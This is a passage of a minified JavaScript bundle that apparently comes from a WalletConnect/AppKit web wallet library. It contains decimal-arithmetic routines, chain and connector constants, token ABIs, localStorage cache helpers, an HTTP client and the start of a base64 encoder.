s(r),n.s!=r.s)return r.s=-r.s,n.minus(r);var o=n.e,a=n.c,c=r.e,l=r.c;if(!a[0]||!l[0])return l[0]||(a[0]?r=new s(n):r.s=n.s),r;if(a=a.slice(),e=o-c){for(e>0?(c=o,i=l):(e=-e,i=a),i.reverse();e--;)i.push(0);i.reverse()}for(a.length-l.length<0&&(i=l,l=a,a=i),e=l.length,t=0;e;a[e]%=10)t=(a[--e]=a[e]+l[e]+t)/10|0;for(t&&(a.unshift(t),++c),e=a.length;a[--e]===0;)a.pop();return r.c=a,r.e=c,r};ji.pow=function(r){var e=this,t=new e.constructor("1"),i=t,n=r<0;if(r!==~~r||r<-gL||r>gL)throw Error(t2+"exponent");for(n&&(r=-r);r&1&&(i=i.times(e)),r>>=1,!!r;)e=e.times(e);return n?t.div(i):i};ji.prec=function(r,e){if(r!==~~r||r<1||r>K1)throw Error(t2+"precision");return r2(new this.constructor(this),r,e)};ji.round=function(r,e){if(r===yd)r=0;else if(r!==~~r||r<-K1||r>K1)throw Error(Qx);return r2(new this.constructor(this),r+this.e+1,e)};ji.sqrt=function(){var r,e,t,i=this,n=i.constructor,s=i.s,o=i.e,a=new n("0.5");if(!i.c[0])return new n(i);if(s<0)throw Error(n4+"No square root");s=Math.sqrt(+i2(i,!0,!0)),s===0||s===1/0?(e=i.c.join(""),e.length+o&1||(e+="0"),s=Math.sqrt(e),o=((o+1)/2|0)-(o<0||o&1),r=new n((s==1/0?"5e":(s=s.toExponential()).slice(0,s.indexOf("e")+1))+o)):r=new n(s+""),o=r.e+(n.DP+=4);do t=r,r=a.times(t.plus(i.div(t)));while(t.c.slice(0,o).join("")!==r.c.slice(0,o).join(""));return r2(r,(n.DP-=4)+r.e+1,n.RM)};ji.times=ji.mul=function(r){var e,t=this,i=t.constructor,n=t.c,s=(r=new i(r)).c,o=n.length,a=s.length,c=t.e,l=r.e;if(r.s=t.s==r.s?1:-1,!n[0]||!s[0])return r.c=[r.e=0],r;for(r.e=c+l,o<a&&(e=n,n=s,s=e,l=o,o=a,a=l),e=new Array(l=o+a);l--;)e[l]=0;for(c=a;c--;){for(a=0,l=o+c;l>c;)a=e[l]+s[c]*n[l-c-1]+a,e[l--]=a%10,a=a/10|0;e[l]=a}for(a?++r.e:e.shift(),c=e.length;!e[--c];)e.pop();return r.c=e,r};ji.toExponential=function(r,e){var t=this,i=t.c[0];if(r!==yd){if(r!==~~r||r<0||r>K1)throw Error(Qx);for(t=r2(new t.constructor(t),++r,e);t.c.length<r;)t.c.push(0)}return i2(t,!0,!!i)};ji.toFixed=function(r,e){var t=this,i=t.c[0];if(r!==yd){if(r!==~~r||r<0||r>K1)throw Error(Qx);for(t=r2(new t.constructor(t),r+t.e+1,e),r=r+t.e+1;t.c.length<r;)t.c.push(0)}return i2(t,!1,!!i)};ji[Symbol.for("nodejs.util.inspect.custom")]=ji.toJSON=ji.toString=function(){var r=this,e=r.constructor;return i2(r,r.e<=e.NE||r.e>=e.PE,!!r.c[0])};ji.toNumber=function(){var r=+i2(this,!0,!0);if(this.constructor.strict===!0&&!this.eq(r.toString()))throw Error(n4+"Imprecise conversion");return r};ji.toPrecision=function(r,e){var t=this,i=t.constructor,n=t.c[0];if(r!==yd){if(r!==~~r||r<1||r>K1)throw Error(t2+"precision");for(t=r2(new i(t),r,e);t.c.length<r;)t.c.push(0)}return i2(t,r<=t.e||t.e<=i.NE||t.e>=i.PE,!!n)};ji.valueOf=function(){var r=this,e=r.constructor;if(e.strict===!0)throw Error(n4+"valueOf disallowed");return i2(r,r.e<=e.NE||r.e>=e.PE,!0)};var dd=IJ();const Tr={bigNumber(r){return r?new dd(r):new dd(0)},multiply(r,e){if(r===void 0||e===void 0)return new dd(0);const t=new dd(r),i=new dd(e);return t.times(i)},formatNumberToLocalString(r,e=2){return r===void 0?"0.00":typeof r=="number"?r.toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e}):parseFloat(r).toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e})},parseLocalStringToNumber(r){return r===void 0?0:parseFloat(r.replace(/,/gu,""))}},v1e={numericInputKeyDown(r,e,t){const i=["Backspace","Meta","Ctrl","a","A","c","C","x","X","v","V","ArrowLeft","ArrowRight","Tab"],n=r.metaKey||r.ctrlKey,s=r.key,o=s.toLocaleLowerCase(),a=o==="a",c=o==="c",l=o==="v",u=o==="x",d=s===",",h=s===".",f=s>="0"&&s<="9";!n&&(a||c||l||u)&&r.preventDefault(),e==="0"&&!d&&!h&&s==="0"&&r.preventDefault(),e==="0"&&f&&(t(s),r.preventDefault()),(d||h)&&(e||(t("0."),r.preventDefault()),(e?.includes(".")||e?.includes(","))&&r.preventDefault()),!f&&!i.includes(s)&&!h&&!d&&r.preventDefault()}},y1e=[{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"_to",type:"address"},{name:"_value",type:"uint256"}],outputs:[{name:"",type:"bool"}]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_value",type:"uint256"}],outputs:[{name:"",type:"bool"}]}],x1e=[{type:"function",name:"approve",stateMutability:"nonpayable",inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]}],C1e=[{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"sender",type:"address"},{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{name:"",type:"bool"}]}],Me={WC_NAME_SUFFIX:".reown.id",WC_NAME_SUFFIX_LEGACY:".wcn.id",BLOCKCHAIN_API_RPC_URL:"https://rpc.walletconnect.org",PULSE_API_URL:"https://pulse.walletconnect.org",W3M_API_URL:"https://api.web3modal.org",CONNECTOR_ID:{WALLET_CONNECT:"walletConnect",INJECTED:"injected",WALLET_STANDARD:"announced",COINBASE:"coinbaseWallet",COINBASE_SDK:"coinbaseWalletSDK",SAFE:"safe",LEDGER:"ledger",OKX:"okx",EIP6963:"eip6963",AUTH:"ID_AUTH"},CONNECTOR_NAMES:{AUTH:"Auth"},AUTH_CONNECTOR_SUPPORTED_CHAINS:["eip155","solana"],LIMITS:{PENDING_TRANSACTIONS:99},CHAIN:{EVM:"eip155",SOLANA:"solana",POLKADOT:"polkadot",BITCOIN:"bip122"},CHAIN_NAME_MAP:{eip155:"Ethereum",solana:"Solana",polkadot:"Polkadot",bip122:"Bitcoin"},USDT_CONTRACT_ADDRESSES:["0xdac17f958d2ee523a2206206994597c13d831ec7","0xc2132d05d31c914a87c6611c10748aeb04b58e8f","0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7","0x919C1c267BC06a7039e03fcc2eF738525769109c","0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e","0x55d398326f99059fF775485246999027B3197955","0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9"],HTTP_STATUS_CODES:{SERVICE_UNAVAILABLE:503,FORBIDDEN:403},UNSUPPORTED_NETWORK_NAME:"Unknown Network"},E1e={getERC20Abi:r=>Me.USDT_CONTRACT_ADDRESSES.includes(r)?C1e:y1e,getSwapAbi:()=>x1e},TJ={URLS:{FAQ:"https://walletconnect.com/faq"}},kh={validateCaipAddress(r){if(r.split(":")?.length!==3)throw new Error("Invalid CAIP Address");return r},parseCaipAddress(r){const e=r.split(":");if(e.length!==3)throw new Error(`Invalid CAIP-10 address: ${r}`);const[t,i,n]=e;if(!t||!i||!n)throw new Error(`Invalid CAIP-10 address: ${r}`);return{chainNamespace:t,chainId:i,address:n}},parseCaipNetworkId(r){const e=r.split(":");if(e.length!==2)throw new Error(`Invalid CAIP-2 network id: ${r}`);const[t,i]=e;if(!t||!i)throw new Error(`Invalid CAIP-2 network id: ${r}`);return{chainNamespace:t,chainId:i}}},Mr={WALLET_ID:"@appkit/wallet_id",WALLET_NAME:"@appkit/wallet_name",SOLANA_WALLET:"@appkit/solana_wallet",SOLANA_CAIP_CHAIN:"@appkit/solana_caip_chain",ACTIVE_CAIP_NETWORK_ID:"@appkit/active_caip_network_id",CONNECTED_SOCIAL:"@appkit/connected_social",CONNECTED_SOCIAL_USERNAME:"@appkit-wallet/SOCIAL_USERNAME",RECENT_WALLETS:"@appkit/recent_wallets",DEEPLINK_CHOICE:"WALLETCONNECT_DEEPLINK_CHOICE",ACTIVE_NAMESPACE:"@appkit/active_namespace",CONNECTED_NAMESPACES:"@appkit/connected_namespaces",CONNECTION_STATUS:"@appkit/connection_status",SIWX_AUTH_TOKEN:"@appkit/siwx-auth-token",SIWX_NONCE_TOKEN:"@appkit/siwx-nonce-token",SOCIAL_PROVIDER:"@appkit/social_provider",NATIVE_BALANCE_CACHE:"@appkit/native_balance_cache",PORTFOLIO_CACHE:"@appkit/portfolio_cache",ENS_CACHE:"@appkit/ens_cache",IDENTITY_CACHE:"@appkit/identity_cache"};function X_(r){if(!r)throw new Error("Namespace is required for CONNECTED_CONNECTOR_ID");return`@appkit/${r}:connected_connector_id`}const _r={setItem(r,e){t5()&&e!==void 0&&localStorage.setItem(r,e)},getItem(r){if(t5())return localStorage.getItem(r)||void 0},removeItem(r){t5()&&localStorage.removeItem(r)},clear(){t5()&&localStorage.clear()}};function t5(){return typeof window<"u"&&typeof localStorage<"u"}function gd(r,e){return e==="light"?{"--w3m-accent":r?.["--w3m-accent"]||"hsla(231, 100%, 70%, 1)","--w3m-background":"#fff"}:{"--w3m-accent":r?.["--w3m-accent"]||"hsla(230, 100%, 67%, 1)","--w3m-background":"#121313"}}function _1e(r){return r?.endsWith(Me.WC_NAME_SUFFIX_LEGACY)||r?.endsWith(Me.WC_NAME_SUFFIX)}var S1e={};const eS=S1e.NEXT_PUBLIC_SECURE_SITE_ORIGIN||"https://secure.walletconnect.org",kJ=[{label:"Coinbase",name:"coinbase",feeRange:"1-2%",url:"",supportedChains:["eip155"]},{label:"Meld.io",name:"meld",feeRange:"1-2%",url:"https://meldcrypto.com",supportedChains:["eip155","solana"]}],A1e="WXETMuFUQmqqybHuRkSgxv:25B8LJHSfpG6LVjR2ytU5Cwh7Z4Sch2ocoU",kr={FOUR_MINUTES_MS:24e4,TEN_SEC_MS:1e4,FIVE_SEC_MS:5e3,THREE_SEC_MS:3e3,ONE_SEC_MS:1e3,SECURE_SITE:eS,SECURE_SITE_DASHBOARD:`${eS}/dashboard`,SECURE_SITE_FAVICON:`${eS}/images/favicon.png`,RESTRICTED_TIMEZONES:["ASIA/SHANGHAI","ASIA/URUMQI","ASIA/CHONGQING","ASIA/HARBIN","ASIA/KASHGAR","ASIA/MACAU","ASIA/HONG_KONG","ASIA/MACAO","ASIA/BEIJING","ASIA/HARBIN"],WC_COINBASE_PAY_SDK_CHAINS:["ethereum","arbitrum","polygon","avalanche-c-chain","optimism","celo","base"],WC_COINBASE_PAY_SDK_FALLBACK_CHAIN:"ethereum",WC_COINBASE_PAY_SDK_CHAIN_NAME_MAP:{Ethereum:"ethereum","Arbitrum One":"arbitrum",Polygon:"polygon",Avalanche:"avalanche-c-chain","OP Mainnet":"optimism",Celo:"celo",Base:"base"},WC_COINBASE_ONRAMP_APP_ID:"bf18c88d-495a-463b-b249-0b9d3656cf5e",SWAP_SUGGESTED_TOKENS:["ETH","UNI","1INCH","AAVE","SOL","ADA","AVAX","DOT","LINK","NITRO","GAIA","MILK","TRX","NEAR","GNO","WBTC","DAI","WETH","USDC","USDT","ARB","BAL","BICO","CRV","ENS","MATIC","OP"],SWAP_POPULAR_TOKENS:["ETH","UNI","1INCH","AAVE","SOL","ADA","AVAX","DOT","LINK","NITRO","GAIA","MILK","TRX","NEAR","GNO","WBTC","DAI","WETH","USDC","USDT","ARB","BAL","BICO","CRV","ENS","MATIC","OP","METAL","DAI","CHAMP","WOLF","SALE","BAL","BUSD","MUST","BTCpx","ROUTE","HEX","WELT","amDAI","VSQ","VISION","AURUM","pSP","SNX","VC","LINK","CHP","amUSDT","SPHERE","FOX","GIDDY","GFC","OMEN","OX_OLD","DE","WNT"],BALANCE_SUPPORTED_CHAINS:["eip155","solana"],SWAP_SUPPORTED_NETWORKS:["eip155:1","eip155:42161","eip155:10","eip155:324","eip155:8453","eip155:56","eip155:137","eip155:100","eip155:43114","eip155:250","eip155:8217","eip155:1313161554"],NAMES_SUPPORTED_CHAIN_NAMESPACES:["eip155"],ONRAMP_SUPPORTED_CHAIN_NAMESPACES:["eip155","solana"],ACTIVITY_ENABLED_CHAIN_NAMESPACES:["eip155","solana"],NATIVE_TOKEN_ADDRESS:{eip155:"0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",solana:"So11111111111111111111111111111111111111111",polkadot:"0x",bip122:"0x"},CONVERT_SLIPPAGE_TOLERANCE:1,CONNECT_LABELS:{MOBILE:"Open and continue in a new browser tab"},DEFAULT_FEATURES:{swaps:!0,onramp:!0,receive:!0,send:!0,email:!0,emailShowWallets:!0,socials:["google","x","discord","farcaster","github","apple","facebook"],history:!0,analytics:!0,allWallets:!0,legalCheckbox:!1,smartSessions:!1,collapseWallets:!1,walletFeaturesOrder:["onramp","swaps","receive","send"],connectMethodsOrder:void 0},DEFAULT_ACCOUNT_TYPES:{bip122:"payment",eip155:"smartAccount",polkadot:"eoa",solana:"eoa"}},ke={isMobile(){return this.isClient()?!!(window.matchMedia("(pointer:coarse)").matches||/Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/u.test(navigator.userAgent)):!1},checkCaipNetwork(r,e=""){return r?.caipNetworkId.toLocaleLowerCase().includes(e.toLowerCase())},isAndroid(){if(!this.isMobile())return!1;const r=window.navigator.userAgent.toLowerCase();return ke.isMobile()&&r.includes("android")},isIos(){if(!this.isMobile())return!1;const r=window.navigator.userAgent.toLowerCase();return r.includes("iphone")||r.includes("ipad")},isSafari(){return this.isClient()?window.navigator.userAgent.toLowerCase().includes("safari"):!1},isClient(){return typeof window<"u"},isPairingExpired(r){return r?r-Date.now()<=kr.TEN_SEC_MS:!0},isAllowedRetry(r,e=kr.ONE_SEC_MS){return Date.now()-r>=e},copyToClopboard(r){navigator.clipboard.writeText(r)},isIframe(){try{return window.self!==window.top}catch{return!1}},getPairingExpiry(){return Date.now()+kr.FOUR_MINUTES_MS},getNetworkId(r){return r?.split(":")[1]},getPlainAddress(r){return r?.split(":")[2]},async wait(r){return new Promise(e=>{setTimeout(e,r)})},debounce(r,e=500){let t;return(...i)=>{function n(){r(...i)}t&&clearTimeout(t),t=setTimeout(n,e)}},isHttpUrl(r){return r.startsWith("http://")||r.startsWith("https://")},formatNativeUrl(r,e){if(ke.isHttpUrl(r))return this.formatUniversalUrl(r,e);let t=r;t.includes("://")||(t=r.replaceAll("/","").replaceAll(":",""),t=`${t}://`),t.endsWith("/")||(t=`${t}/`),this.isTelegram()&&this.isAndroid()&&(e=encodeURIComponent(e));const i=encodeURIComponent(e);return{redirect:`${t}wc?uri=${i}`,href:t}},formatUniversalUrl(r,e){if(!ke.isHttpUrl(r))return this.formatNativeUrl(r,e);let t=r;t.endsWith("/")||(t=`${t}/`);const i=encodeURIComponent(e);return{redirect:`${t}wc?uri=${i}`,href:t}},getOpenTargetForPlatform(r){return r==="popupWindow"?r:this.isTelegram()?_r.getItem(Mr.SOCIAL_PROVIDER)?"_top":"_blank":r},openHref(r,e,t){window.open(r,this.getOpenTargetForPlatform(e),t||"noreferrer noopener")},returnOpenHref(r,e,t){return window.open(r,this.getOpenTargetForPlatform(e),t||"noreferrer noopener")},isTelegram(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)},async preloadImage(r){const e=new Promise((t,i)=>{const n=new Image;n.onload=t,n.onerror=i,n.crossOrigin="anonymous",n.src=r});return Promise.race([e,ke.wait(2e3)])},formatBalance(r,e){let t="0.000";if(typeof r=="string"){const i=Number(r);if(i){const n=Math.floor(i*1e3)/1e3;n&&(t=n.toString())}}return`${t}${e?` ${e}`:""}`},formatBalance2(r,e){let t;if(r==="0")t="0";else if(typeof r=="string"){const i=Number(r);i&&(t=i.toString().match(/^-?\d+(?:\.\d{0,3})?/u)?.[0])}return{value:t??"0",rest:t==="0"?"000":"",symbol:e}},getApiUrl(){return Me.W3M_API_URL},getBlockchainApiUrl(){return Me.BLOCKCHAIN_API_RPC_URL},getAnalyticsUrl(){return Me.PULSE_API_URL},getUUID(){return crypto?.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,r=>{const e=Math.random()*16|0;return(r==="x"?e:e&3|8).toString(16)})},parseError(r){return typeof r=="string"?r:typeof r?.issues?.[0]?.message=="string"?r.issues[0].message:r instanceof Error?r.message:"Unknown error"},sortRequestedNetworks(r,e=[]){const t={};return e&&r&&(r.forEach((i,n)=>{t[i]=n}),e.sort((i,n)=>{const s=t[i.id],o=t[n.id];return s!==void 0&&o!==void 0?s-o:s!==void 0?-1:o!==void 0?1:0})),e},calculateBalance(r){let e=0;for(const t of r)e+=t.value??0;return e},formatTokenBalance(r){const e=r.toFixed(2),[t,i]=e.split(".");return{dollars:t,pennies:i}},isAddress(r,e="eip155"){switch(e){case"eip155":if(/^(?:0x)?[0-9a-f]{40}$/iu.test(r)){if(/^(?:0x)?[0-9a-f]{40}$/iu.test(r)||/^(?:0x)?[0-9A-F]{40}$/iu.test(r))return!0}else return!1;return!1;case"solana":return/[1-9A-HJ-NP-Za-km-z]{32,44}$/iu.test(r);default:return!1}},uniqueBy(r,e){const t=new Set;return r.filter(i=>{const n=i[e];return t.has(n)?!1:(t.add(n),!0)})},generateSdkVersion(r,e,t){const n=r.length===0?"universal":r.map(s=>s.adapterType).join(",");return`${e}-${n}-${t}`},createAccount(r,e,t,i,n){return{namespace:r,address:e,type:t,publicKey:i,path:n}},isCaipAddress(r){if(typeof r!="string")return!1;const e=r.split(":"),t=e[0];return e.filter(Boolean).length===3&&t in Me.CHAIN_NAME_MAP},isMac(){const r=window.navigator.userAgent.toLowerCase();return r.includes("macintosh")&&!r.includes("safari")},formatTelegramSocialLoginUrl(r){const e=`--${encodeURIComponent(window.location.href)}`,t="state=";if(new URL(r).host==="auth.magic.link"){const n="provider_authorization_url=",s=r.substring(r.indexOf(n)+n.length),o=this.injectIntoUrl(decodeURIComponent(s),t,e);return r.replace(s,encodeURIComponent(o))}return this.injectIntoUrl(r,t,e)},injectIntoUrl(r,e,t){const i=r.indexOf(e);if(i===-1)throw new Error(`${e} parameter not found in the URL: ${r}`);const n=r.indexOf("&",i),s=e.length,o=n!==-1?n:r.length,a=r.substring(0,i+s),c=r.substring(i+s,o),l=r.substring(n),u=c+t;return a+u+l}},Va=sr({walletImages:{},networkImages:{},chainImages:{},connectorImages:{},tokenImages:{},currencyImages:{}}),Li={state:Va,subscribeNetworkImages(r){return ai(Va.networkImages,()=>r(Va.networkImages))},subscribeKey(r,e){return ci(Va,r,e)},subscribe(r){return ai(Va,()=>r(Va))},setWalletImage(r,e){Va.walletImages[r]=e},setNetworkImage(r,e){Va.networkImages[r]=e},setChainImage(r,e){Va.chainImages[r]=e},setConnectorImage(r,e){Va.connectorImages={...Va.connectorImages,[r]:e}},setTokenImage(r,e){Va.tokenImages[r]=e},setCurrencyImage(r,e){Va.currencyImages[r]=e}},I1e={eip155:"ba0ba0cd-17c6-4806-ad93-f9d174f17900",solana:"a1b58899-f671-4276-6a5e-56ca5bd59700",polkadot:"",bip122:""},Nr={async fetchWalletImage(r){if(r)return await Ft._fetchWalletImage(r),this.getWalletImageById(r)},async fetchNetworkImage(r){if(!r)return;const e=this.getNetworkImageById(r);return e||(await Ft._fetchNetworkImage(r),this.getNetworkImageById(r))},getWalletImageById(r){if(r)return Li.state.walletImages[r]},getWalletImage(r){if(r?.image_url)return r?.image_url;if(r?.image_id)return Li.state.walletImages[r.image_id]},getNetworkImage(r){if(r?.assets?.imageUrl)return r?.assets?.imageUrl;if(r?.assets?.imageId)return Li.state.networkImages[r.assets.imageId]},getNetworkImageById(r){if(r)return Li.state.networkImages[r]},getConnectorImage(r){if(r?.imageUrl)return r.imageUrl;if(r?.imageId)return Li.state.connectorImages[r.imageId]},getChainImage(r){return Li.state.networkImages[I1e[r]]}};async function ub(...r){const e=await fetch(...r);if(!e.ok)throw new Error(`HTTP status code: ${e.status}`,{cause:e});return e}let Xx=class{constructor({baseUrl:e,clientId:t}){this.baseUrl=e,this.clientId=t}async get({headers:e,signal:t,cache:i,...n}){const s=this.createUrl(n);return(await ub(s,{method:"GET",headers:e,signal:t,cache:i})).json()}async getBlob({headers:e,signal:t,...i}){const n=this.createUrl(i);return(await ub(n,{method:"GET",headers:e,signal:t})).blob()}async post({body:e,headers:t,signal:i,...n}){const s=this.createUrl(n);return(await ub(s,{method:"POST",headers:t,body:e?JSON.stringify(e):void 0,signal:i})).json()}async put({body:e,headers:t,signal:i,...n}){const s=this.createUrl(n);return(await ub(s,{method:"PUT",headers:t,body:e?JSON.stringify(e):void 0,signal:i})).json()}async delete({body:e,headers:t,signal:i,...n}){const s=this.createUrl(n);return(await ub(s,{method:"DELETE",headers:t,body:e?JSON.stringify(e):void 0,signal:i})).json()}createUrl({path:e,params:t}){const i=new URL(e,this.baseUrl);return t&&Object.entries(t).forEach(([n,s])=>{s&&i.searchParams.append(n,s)}),this.clientId&&i.searchParams.append("clientId",this.clientId),i}};const He={cacheExpiry:{portfolio:3e4,nativeBalance:3e4,ens:3e5,identity:3e5},isCacheExpired(r,e){return Date.now()-r>e},getActiveNetworkProps(){const r=He.getActiveNamespace(),e=He.getActiveCaipNetworkId(),t=e?e.split(":")[1]:void 0,i=t?isNaN(Number(t))?t:Number(t):void 0;return{namespace:r,caipNetworkId:e,chainId:i}},setWalletConnectDeepLink({name:r,href:e}){try{_r.setItem(Mr.DEEPLINK_CHOICE,JSON.stringify({href:e,name:r}))}catch{console.info("Unable to set WalletConnect deep link")}},getWalletConnectDeepLink(){try{const r=_r.getItem(Mr.DEEPLINK_CHOICE);if(r)return JSON.parse(r)}catch{console.info("Unable to get WalletConnect deep link")}},deleteWalletConnectDeepLink(){try{_r.removeItem(Mr.DEEPLINK_CHOICE)}catch{console.info("Unable to delete WalletConnect deep link")}},setActiveNamespace(r){try{_r.setItem(Mr.ACTIVE_NAMESPACE,r)}catch{console.info("Unable to set active namespace")}},setActiveCaipNetworkId(r){try{_r.setItem(Mr.ACTIVE_CAIP_NETWORK_ID,r),He.setActiveNamespace(r.split(":")[0])}catch{console.info("Unable to set active caip network id")}},getActiveCaipNetworkId(){try{return _r.getItem(Mr.ACTIVE_CAIP_NETWORK_ID)}catch{console.info("Unable to get active caip network id");return}},deleteActiveCaipNetworkId(){try{_r.removeItem(Mr.ACTIVE_CAIP_NETWORK_ID)}catch{console.info("Unable to delete active caip network id")}},deleteConnectedConnectorId(r){try{const e=X_(r);_r.removeItem(e)}catch{console.info("Unable to delete connected connector id")}},setAppKitRecent(r){try{const e=He.getRecentWallets();e.find(i=>i.id===r.id)||(e.unshift(r),e.length>2&&e.pop(),_r.setItem(Mr.RECENT_WALLETS,JSON.stringify(e)))}catch{console.info("Unable to set AppKit recent")}},getRecentWallets(){try{const r=_r.getItem(Mr.RECENT_WALLETS);return r?JSON.parse(r):[]}catch{console.info("Unable to get AppKit recent")}return[]},setConnectedConnectorId(r,e){try{const t=X_(r);_r.setItem(t,e)}catch{console.info("Unable to set Connected Connector Id")}},getActiveNamespace(){try{return _r.getItem(Mr.ACTIVE_NAMESPACE)}catch{console.info("Unable to get active namespace")}},getConnectedConnectorId(r){if(r)try{const e=X_(r);return _r.getItem(e)}catch{console.info("Unable to get connected connector id in namespace ",r)}},setConnectedSocialProvider(r){try{_r.setItem(Mr.CONNECTED_SOCIAL,r)}catch{console.info("Unable to set connected social provider")}},getConnectedSocialProvider(){try{return _r.getItem(Mr.CONNECTED_SOCIAL)}catch{console.info("Unable to get connected social provider")}},deleteConnectedSocialProvider(){try{_r.removeItem(Mr.CONNECTED_SOCIAL)}catch{console.info("Unable to delete connected social provider")}},getConnectedSocialUsername(){try{return _r.getItem(Mr.CONNECTED_SOCIAL_USERNAME)}catch{console.info("Unable to get connected social username")}},getStoredActiveCaipNetworkId(){return _r.getItem(Mr.ACTIVE_CAIP_NETWORK_ID)?.split(":")?.[1]},setConnectionStatus(r){try{_r.setItem(Mr.CONNECTION_STATUS,r)}catch{console.info("Unable to set connection status")}},getConnectionStatus(){try{return _r.getItem(Mr.CONNECTION_STATUS)}catch{return}},getConnectedNamespaces(){try{const r=_r.getItem(Mr.CONNECTED_NAMESPACES);return r?.length?r.split(","):[]}catch{return[]}},setConnectedNamespaces(r){try{const e=Array.from(new Set(r));_r.setItem(Mr.CONNECTED_NAMESPACES,e.join(","))}catch{console.info("Unable to set namespaces in storage")}},addConnectedNamespace(r){try{const e=He.getConnectedNamespaces();e.includes(r)||(e.push(r),He.setConnectedNamespaces(e))}catch{console.info("Unable to add connected namespace")}},removeConnectedNamespace(r){try{const e=He.getConnectedNamespaces(),t=e.indexOf(r);t>-1&&(e.splice(t,1),He.setConnectedNamespaces(e))}catch{console.info("Unable to remove connected namespace")}},getBalanceCache(){let r={};try{const e=_r.getItem(Mr.PORTFOLIO_CACHE);r=e?JSON.parse(e):{}}catch{console.info("Unable to get balance cache")}return r},removeAddressFromBalanceCache(r){try{const e=He.getBalanceCache();_r.setItem(Mr.PORTFOLIO_CACHE,JSON.stringify({...e,[r]:void 0}))}catch{console.info("Unable to remove address from balance cache",r)}},getBalanceCacheForCaipAddress(r){try{const t=He.getBalanceCache()[r];if(t&&!this.isCacheExpired(t.timestamp,this.cacheExpiry.portfolio))return t.balance;He.removeAddressFromBalanceCache(r)}catch{console.info("Unable to get balance cache for address",r)}},updateBalanceCache(r){try{const e=He.getBalanceCache();e[r.caipAddress]=r,_r.setItem(Mr.PORTFOLIO_CACHE,JSON.stringify(e))}catch{console.info("Unable to update balance cache",r)}},getNativeBalanceCache(){let r={};try{const e=_r.getItem(Mr.NATIVE_BALANCE_CACHE);r=e?JSON.parse(e):{}}catch{console.info("Unable to get balance cache")}return r},removeAddressFromNativeBalanceCache(r){try{const e=He.getBalanceCache();_r.setItem(Mr.NATIVE_BALANCE_CACHE,JSON.stringify({...e,[r]:void 0}))}catch{console.info("Unable to remove address from balance cache",r)}},getNativeBalanceCacheForCaipAddress(r){try{const t=He.getNativeBalanceCache()[r];if(t&&!this.isCacheExpired(t.timestamp,this.cacheExpiry.nativeBalance))return t;console.info("Discarding cache for address",r),He.removeAddressFromBalanceCache(r)}catch{console.info("Unable to get balance cache for address",r)}},updateNativeBalanceCache(r){try{const e=He.getNativeBalanceCache();e[r.caipAddress]=r,_r.setItem(Mr.NATIVE_BALANCE_CACHE,JSON.stringify(e))}catch{console.info("Unable to update balance cache",r)}},getEnsCache(){let r={};try{const e=_r.getItem(Mr.ENS_CACHE);r=e?JSON.parse(e):{}}catch{console.info("Unable to get ens name cache")}return r},getEnsFromCacheForAddress(r){try{const t=He.getEnsCache()[r];if(t&&!this.isCacheExpired(t.timestamp,this.cacheExpiry.ens))return t.ens;He.removeEnsFromCache(r)}catch{console.info("Unable to get ens name from cache",r)}},updateEnsCache(r){try{const e=He.getEnsCache();e[r.address]=r,_r.setItem(Mr.ENS_CACHE,JSON.stringify(e))}catch{console.info("Unable to update ens name cache",r)}},removeEnsFromCache(r){try{const e=He.getEnsCache();_r.setItem(Mr.ENS_CACHE,JSON.stringify({...e,[r]:void 0}))}catch{console.info("Unable to remove ens name from cache",r)}},getIdentityCache(){let r={};try{const e=_r.getItem(Mr.IDENTITY_CACHE);r=e?JSON.parse(e):{}}catch{console.info("Unable to get identity cache")}return r},getIdentityFromCacheForAddress(r){try{const t=He.getIdentityCache()[r];if(t&&!this.isCacheExpired(t.timestamp,this.cacheExpiry.identity))return t.identity;He.removeIdentityFromCache(r)}catch{console.info("Unable to get identity from cache",r)}},updateIdentityCache(r){try{const e=He.getIdentityCache();e[r.address]={identity:r.identity,timestamp:r.timestamp},_r.setItem(Mr.IDENTITY_CACHE,JSON.stringify(e))}catch{console.info("Unable to update identity cache",r)}},removeIdentityFromCache(r){try{const e=He.getIdentityCache();_r.setItem(Mr.IDENTITY_CACHE,JSON.stringify({...e,[r]:void 0}))}catch{console.info("Unable to remove identity from cache",r)}},clearAddressCache(){try{_r.removeItem(Mr.PORTFOLIO_CACHE),_r.removeItem(Mr.NATIVE_BALANCE_CACHE),_r.removeItem(Mr.ENS_CACHE),_r.removeItem(Mr.IDENTITY_CACHE)}catch{console.info("Unable to clear address cache")}}};var tS={},db={},mL;function T1e(){if(mL)return db;mL=1,db.byteLength=a,db.toByteArray=l,db.fromByteArray=h;for(var r=[],e=[],t=typeof Uint8Array<"u"?Uint8Array:Array,i="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",n=0,s=i.length;n<s;++n)r[n]=i[n],e[i.charCodeAt(n)]=n;e[45]=62,e[95]=63;function o(f){var p=f.length;if(p%4>0)throw new Error("Invalid string. Length must be a multiple of 4");var g=f.indexOf("=");g===-1&&(g=p);var w=g===p?0:4-g%4;return[g,w]}function a(f){var p=o(f),g=p[0],w=p[1];return(g+w)*3/4-w}function c(f,p,g){return(p+g)*3/4-g}function l(f){var p,g=o(f),w=g[0],m=g[1],x=new 